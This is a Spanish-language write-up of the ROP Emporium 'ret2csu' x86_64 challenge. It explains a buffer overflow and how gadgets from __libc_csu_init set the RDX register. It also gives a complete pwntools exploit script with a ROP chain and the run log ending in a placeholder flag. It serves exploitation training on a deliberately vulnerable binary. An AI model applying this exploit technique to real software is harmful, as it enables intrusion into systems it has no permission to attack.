Este ejercicio es como el [callme](https://ub1cu0.gitbook.io/pwn-writeups/ropemporium/3.-callme-x86_64) pero sin tener que hacer saltos a 3 funciones. Simplemente hay que hacer un salto a la función `ret2win`. Vamos a intentarlo para ver cual es el muro que tenemos ahora:

```c
undefined8 main(void)
{
    pwnme();
    return 0;
}
```

```c
void pwnme(void)
{
    undefined array[32];

    setvbuf(stdout, (char *)0x0, 2, 0);
    puts("ret2csu by ROP Emporium");
    puts("x86_64\n");
    memset(array, 0, 0x20);
    puts(
        "Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n"
    );
    printf("=> ");
    read(0, array, 0x200); // Buffer Overflow
    puts("Thank you!");
    return;
}

```

Como podemos ver la función `pwnme` tiene un buffer overflow con mucha capacidad, lo cual nos da la capacidad de hacer una rop chain larga. Vamos a observar ahora la función `ret2win`:

```c
void ret2win(long param_1, long param_2, long param_3)
{
. . .
    if (((param_1 != -0x2152411021524111) || (param_2 != -0x3501454135014542)) || (param_3 != -0x2ff20ff22ff20ff3)) {
        puts("Incorrect parameters");
        exit(1);
    }
}
. . .
```

Como en el [callme](https://ub1cu0.gitbook.io/pwn-writeups/ropemporium/3.-callme-x86_64), este ejercicio pide 3 argumentos para que nos imprima la flag (`RDI`, `RSI` y `RDX`):

Vamos a buscar gadgets para poner esos registros con los valores que necesitamos:

```c
0x004006a3 : pop rdi ; ret // RDI
0x004006a1 : pop rsi ; pop r15 ; ret // RSI
```

Hay un problema, no hay ningún `pop rdx`. Aquí está la nueva dificultad del ejercicio. Para solucionarlo tenemos que, tal como da a entender el nombre del ejercicio, usar la función `__libc_csu_init`, que se genera automáticamente al compilar un programa y siempre mete un par de gadgets bastante útiles: uno para hacer varios `pop` seguidos y otro que hace `mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]`. Con esto podemos setear `rdx` aunque no haya un `pop rdx` normal, y así pasar todos los argumentos que necesitamos. Vamos a usar la siguiente examen como referencia:

<figure><img src="https://1790737885-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FslrEYJPx2X6Fc2iLHKGp%2Fuploads%2FJPaQXTVI0XZJcs2lk0eu%2Fimage.png?alt=media&#x26;token=9ff52bc1-d929-4777-b040-3a9b93c523df" alt=""><figcaption></figcaption></figure>

Como podemos ver podemos llamar primero al gadget 1 para setear varios registros que luego en el gadget 2 lo moverán a los registros que nos hacían falta. Tenemos que tener en cuenta que en el gadget 2 hay un call así que tenemos que intentar que esto:

```c
400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
```

Da como resultado una función que nos haga un return y que no nos altere ningún registro importante. Otra cosa a tener en cuenta es que en el gadget 1 hay que poner que el `rbx` sea el valor de `rbp - 1` ya que el gadget tiene estas lineas:

```c
  400691:	48 39 dd             	cmp    rbp,rbx
  400694:	75 ea                	jne    400680 <__libc_csu_init+0x40>
```

Entonces si no se cumple eso hará un salto a otra función y no queremos eso. Tenemos que tener en cuenta también que en la segunda pasada se volverán a hacer los pops así que tenemos que popear 7 veces algo, 6 veces por los `pop` y 1 vez por el `add`. Ahora que sabemos esto podemos preparar el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./ret2csu")
libc = ELF("./libret2csu.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b 400696
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()
    
    pop_rdi = 0x004006a3 # pop rdi ; ret
    mov_long = 0x400680
    pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a
    pop_rsi_r15 = 0x004006a1 # pop rsi ; pop r15 ; ret
    
    parametros = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]
    
    # 400680:	4c 89 fa             	mov    rdx,r15
    # 400683:	4c 89 f6             	mov    rsi,r14
    # 400686:	44 89 ef             	mov    edi,r13d
    # 400689:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
    # 40068d:	48 83 c3 01          	add    rbx,0x1
    # 400691:	48 39 dd             	cmp    rbp,rbx
    # 400694:	75 ea                	jne    400680 <__libc_csu_init+0x40>
    # 400696:	48 83 c4 08          	add    rsp,0x8
    # 40069a:	5b                   	pop    rbx
    # 40069b:	5d                   	pop    rbp
    # 40069c:	41 5c                	pop    r12
    # 40069e:	41 5d                	pop    r13
    # 4006a0:	41 5e                	pop    r14
    # 4006a2:	41 5f                	pop    r15
    # 4006a4:	c3                   	ret
    
    # Contents of section .init_array:
    # 600df0 00064000 00000000

    offset = 40
    
    payload = flat({
        offset: [
            pop_rbx_rbp_r12_r13_r14_r15, 0, 1, 0x600df0, 0x0, parametros[1], parametros[2],
            mov_long, 0, 0, 0, 0, 0, 0, 0,
            pop_rdi, parametros[0],
            pop_rsi_r15, parametros[1], 0,
            exe.plt['ret2win'],
        ]
    })


    io.sendlineafter(b'>', payload)
    
    io.interactive()

if __name__ == "__main__":
    main()
```

```c
[+] Starting local process '/home/ub1cu0/Desktop/ropEmporium/ret2csu/ret2csu': pid 822203
[DEBUG] Received 0x8c bytes:
    b'ret2csu by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n'
    b'\n'
    b'> '
[DEBUG] Sent 0xd1 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  9a 06 40 00  00 00 00 00  │iaaa│jaaa│··@·│····│
    00000030  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    00000040  f0 0d 60 00  00 00 00 00  00 00 00 00  00 00 00 00  │··`·│····│····│····│
    00000050  be ba fe ca  be ba fe ca  0d f0 0d d0  0d f0 0d d0  │····│····│····│····│
    00000060  80 06 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000000a0  a3 06 40 00  00 00 00 00  ef be ad de  ef be ad de  │··@·│····│····│····│
    000000b0  a1 06 40 00  00 00 00 00  be ba fe ca  be ba fe ca  │··@·│····│····│····│
    000000c0  00 00 00 00  00 00 00 00  10 05 40 00  00 00 00 00  │····│····│··@·│····│
    000000d0  0a                                                  │·│
    000000d1
[*] Switching to interactive mode
 [*] Process '/home/ub1cu0/Desktop/ropEmporium/ret2csu/ret2csu' stopped with exit code 0 (pid 822203)
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

Funciona! Gracias por leer!
